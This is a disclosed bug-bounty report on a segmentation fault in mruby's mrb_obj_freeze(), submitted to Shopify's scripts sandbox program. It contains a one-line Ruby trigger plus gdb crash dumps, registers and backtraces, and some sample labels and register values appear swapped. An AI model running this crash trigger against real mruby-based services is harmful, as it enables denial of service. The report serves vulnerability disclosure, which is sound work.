# SIGSEGV mrb_obj_freeze() Manipulating Register RAX and RSI

## Report Details
- **Report ID**: 191994
- **URL**: https://hackerone.com/reports/191994
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-17T17:45:22.008Z
- **Disclosed**: 2017-02-10T21:55:40.341Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
There is an invalid memory read on mruby when calling to mrb_obj_freeze() with a invalid "Struct RBasic*" which causes a SIGSEGV and leads to denial of service or remote.

The following code triggers the bug (attached as mrb_obj_freeze.rb):

	o=0x30303030.freeze

Crash
---------------------

Here we can see the crash (full crash output attached)

	root@x:/home/x/Desktop/shopify/research/mruby-engine/bin# ./sandbox mrb_obj_freeze.rb 
	./sandbox:20: [BUG] Segmentation fault at 0x00000060606061
	ruby 2.2.5p319 (2016-04-26 revision 54774) [x86_64-linux-gnu]

	-- Control frame information -----------------------------------------------
	c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
	c:0002 p:0186 s:0005 E:0007d8 EVAL   ./sandbox:20 [FINISH]
	c:0001 p:0000 s:0002 E:0023f0 TOP    [FINISH]

	-- Ruby level backtrace information ----------------------------------------
	./sandbox:20:in `<main>'
	./sandbox:20:in `sandbox_eval'

	-- Machine register context ------------------------------------------------
	 RIP: 0x00007f96c6cac713 RBP: 0x0000000000000000 RSP: 0x00007f96c57e79d8
	 RAX: 0x0000000060606061 RBX: 0x0000000000000000 RCX: 0x00007f96c57f5a00
	 RDX: 0x0000000000000002 RDI: 0x00007f96c57e94e0 RSI: 0x0000000060606061
	  R8: 0x0000000000000000  R9: 0x0000000000000000 R10: 0x000000000000004c
	 R11: 0x0000000000000000 R12: 0x00007f96c57f4700 R13: 0x00007f96c57f5a00
	 R14: 0x0000000000000002 R15: 0x00007f96c57e94e0 EFL: 0x0000000000010297

	-- C level backtrace information -------------------------------------------
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f96cb36a875]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f96cb36aaac]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f96cb2470cb]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f96cb2fd0ce]
	/lib/x86_64-linux-gnu/libc.so.6 [0x7f96cae48cb0]

Crash Debug
---------------------

	(gdb) r /home/x/Desktop/shopify/research/mruby-engine/bin/sandbox mrb_obj_freeze.rb
	Starting program: /usr/bin/ruby /home/x/Desktop/shopify/research/mruby-engine/bin/sandbox mrb_obj_freeze.rb
	warning: the debug information found in "/lib64/ld-2.19.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).

	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
	[New Thread 0x7ffff7ff5700 (LWP 19164)]
	[New Thread 0x7ffff1f6e700 (LWP 19327)]

	Program received signal SIGSEGV, Segmentation fault.
	[Switching to Thread 0x7ffff1f6e700 (LWP 19327)]
	mrb_obj_freeze (mrb=0x7ffff1f6f4e0, self=...) at /home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/kernel.c:458
	458	  MRB_SET_FROZEN_FLAG(b);

	Function Information
	---------------------

	(gdb) list *$rip
	0x7ffff3432713 is in mrb_obj_freeze (/home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/kernel.c:458).
	453	static mrb_value
	454	mrb_obj_freeze(mrb_state *mrb, mrb_value self)
	455	{
	456	  struct RBasic *b = mrb_basic_ptr(self); 
	457	
	458	  MRB_SET_FROZEN_FLAG(b);
	459	  return self;
	460	}

	Register Information
	---------------------

	(gdb) info reg
	rax            0x8282828283	560535339651		//****** Overflow ******//
	rbx            0x0	0
	rcx            0x7ffff1f7ba00	140737252932096
	rdx            0x2	2
	rsi            0x8282828283	560535339651		//****** Overflow ******//
	rdi            0x7ffff1f6f4e0	140737252881632
	rbp            0x0	0x0
	rsp            0x7ffff1f6d9d8	0x7ffff1f6d9d8
	r8             0x0	0
	r9             0x0	0
	r10            0x4c	76
	r11            0x0	0
	r12            0x7ffff1f7a700	140737252927232
	r13            0x7ffff1f7ba00	140737252932096
	r14            0x2	2
	r15            0x7ffff1f6f4e0	140737252881632
	rip            0x7ffff3432713	0x7ffff3432713 <mrb_obj_freeze+3>
	eflags         0x10297	[ CF PF AF SF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0

Value Information
---------------------

	(gdb) p self
	$1 = {value = {p = 0x8282828283, {i_flag = 1, i = 1094795585}, {sym_flag = 131, sym = 0}, bp = 0x8282828283, fp = 0x8282828283, vp = 0x8282828283}, 
	  w = 2189591171}
	(gdb) p b
	$2 = (struct RBasic *) 0x60606061

Backtrace
---------------------

	(gdb) bt
	#0  mrb_obj_freeze (mrb=0x7ffff1f6f4e0, self=...) at /home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/kernel.c:458
	#1  0x00007ffff33ec183 in mrb_vm_exec (mrb=mrb@entry=0x7ffff1f6f4e0, proc=<optimized out>, proc@entry=0x7ffff1f77130, pc=0x7ffff1fceb94)
		at /home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1169
	#2  0x00007ffff33f26bc in mrb_vm_run (mrb=0x7ffff1f6f4e0, proc=0x7ffff1f77130, self=..., stack_keep=stack_keep@entry=0)
		at /home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:770
	#3  0x00007ffff33da2ee in mruby_engine_monitored_eval (data=0x7ffff1f6f3e0) at /home/x/Desktop/shopify/mruby-engine/ext/mruby_engine/eval_monitored.c:68
	#4  0x00007ffff7382184 in start_thread (arg=0x7ffff1f6e700) at pthread_create.c:312
	#5  0x00007ffff769237d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111

The crash happens at mruby-engine/ext/mruby_engine/mruby/src/kernel.c:458 which is built inline

	mrb_obj_freeze(mrb_state *mrb, mrb_value self)
	{
		struct RBasic *b = mrb_basic_ptr(self); 
		
		MRB_SET_FROZEN_FLAG(b);
		return self;
	}

Other Sample:
---------------------

Sample code:
	o=0x41414141.freeze

	(gdb) r /home/x/Desktop/shopify/research/mruby-engine/bin/sandbox mrb_obj_freeze-2.rb 
	Starting program: /usr/bin/ruby ../../../research/mruby-engine/bin/sandbox mrb_obj_freeze-2.rb
	warning: the debug information found in "/lib64/ld-2.19.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).

	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
	[New Thread 0x7ffff7ff5700 (LWP 10574)]
	[New Thread 0x7ffff1f6e700 (LWP 10762)]

	Program received signal SIGSEGV, Segmentation fault.
	[Switching to Thread 0x7ffff1f6e700 (LWP 10762)]
	mrb_obj_freeze (mrb=0x7ffff1f6f4e0, self=...) at /home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/kernel.c:458
	458	  MRB_SET_FROZEN_FLAG(b);
	(gdb) info reg
	rax            0x60606061	1616928865				//****** Overflow ******//
	rbx            0x0	0
	rcx            0x7ffff1f7ba00	140737252932096
	rdx            0x2	2
	rsi            0x60606061	1616928865				//****** Overflow ******//
	rdi            0x7ffff1f6f4e0	140737252881632
	rbp            0x0	0x0
	rsp            0x7ffff1f6d9d8	0x7ffff1f6d9d8
	r8             0x0	0
	r9             0x0	0
	r10            0x4c	76
	r11            0x0	0
	r12            0x7ffff1f7a700	140737252927232
	r13            0x7ffff1f7ba00	140737252932096
	r14            0x2	2
	r15            0x7ffff1f6f4e0	140737252881632
	rip            0x7ffff3432713	0x7ffff3432713 <mrb_obj_freeze+3>
	eflags         0x10297	[ CF PF AF SF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) p self
	$1 = {value = {p = 0x60606061, {i_flag = 1, i = 808464432}, {sym_flag = 97, sym = 0}, bp = 0x60606061, fp = 0x60606061, vp = 0x60606061}, 
	  w = 1616928865}
	(gdb) p b
	$2 = (struct RBasic *) 0x60606061


Result:
---------------------

	./sandbox mrb_obj_freeze.rb 2>&1 | head -1
	./sandbox:20: [BUG] Segmentation fault at 0x00000082828283

	./sandbox mrb_obj_freeze-2.rb 2>&1 | head -1
	./sandbox:20: [BUG] Segmentation fault at 0x00000060606061

Impact

An attacker can control these values. It can create an attack vector.
But I doubt you can do that.

## Attachments
- mrb_obj_freeze.rb
- mrb_obj_freeze-2.rb
- sandbox.log
